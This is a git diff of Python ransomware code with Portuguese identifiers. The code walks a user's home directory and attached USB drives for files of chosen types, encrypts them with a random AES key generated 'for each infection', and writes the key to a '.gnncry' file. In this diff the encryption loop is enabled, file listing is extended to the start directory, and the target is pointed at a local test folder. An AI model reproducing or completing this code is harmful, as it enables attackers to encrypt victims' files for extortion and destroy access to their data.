@@ -91,13 +91,14 @@ NOVAS COISAS :
 # Starting point of encrypting
 def menu(senha_AES):
     tipos_arquivos = file_types.split(' ')
-    home = os.environ['HOME'] # /home/user is the start point
-    t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
-    t.start()
+    #home = os.environ['HOME'] # /home/user is the start point
+    home = '/home/tarcisio/Desktop/testes/'
+    #t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
+    #t.start()
     listar(senha_AES, home, tipos_arquivos)
     #listar_media(senha_AES,tipos_arquivos)
-    while threading.active_count() > 1:
-        pass
+    #while threading.active_count() > 1:
+    #    pass
 
 # look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
@@ -115,16 +116,23 @@ def listar_media(senha_AES, tipos_arq):
                         break
 
 
-    ''' #cripto routine
+        '''#cripto routine
         for element in encrypt_list: # encrypt happens here
             try:
                 criptografa(chave_AES , element)
             except:
-                print('Error Encrypting file: '+ element)
-    '''
+                print('Error Encrypting file: '+ element)'''
 
 # lists and encrypt files
 def listar(chave_AES,diretorio, tipos_arq):
+    # add to the list the files inside the start directory
+    file_to_encrypt = []
+    arqs = os.listdir(diretorio)
+    for arquivo in arqs:
+        if(os.path.isfile(os.path.join(diretorio, arquivo))):
+            file_to_encrypt.append(os.path.join(diretorio,arquivo))
+
+    # add the file inside each directory
     ignorar = diretorio + '/.avfs'
     home = os.environ['HOME']
     listagem_dos_diretorios = os.listdir(diretorio)
@@ -134,7 +142,7 @@ def listar(chave_AES,diretorio, tipos_arq):
 
     encrypt_list = [] # list of files found
     for elemento in listagem_dos_diretorios: # start looking throught the home directory of the user
-        for caminho, diret, arquivo in os.walk(os.path.join(home, elemento)):
+        for caminho, diret, arquivo in os.walk(os.path.join(diretorio, elemento)):
             for arq in arquivo:
                 file_found = os.path.join(caminho, arq)
                 extensao = os.path.splitext(file_found)
@@ -142,13 +150,18 @@ def listar(chave_AES,diretorio, tipos_arq):
                     if(extensao[1] == ext): # found file with the extension
                         encrypt_list.append(file_found)
                         break
-'''
+
+    for e in file_to_encrypt: # append local files inside the complete list of files inside directories
+        encrypt_list.append(e)
+
+    #
+
     for element in encrypt_list: # encrypt happens here
         try:
             criptografa(chave_AES , element)
         except:
             print('Error Encrypting file: '+ element)
-'''
+
 
 
 # Generate random AES key for each infection
@@ -166,7 +179,7 @@ def gera_chave_AES():
     for char in xrange(tamanho):
         senha += choice(caracters)
 
-    with open(caminho_correto + 'AES.txt','w') as f:
+    with open(caminho_correto + 'AES.gnncry','w') as f:
         f.write(senha)
     return senha
 
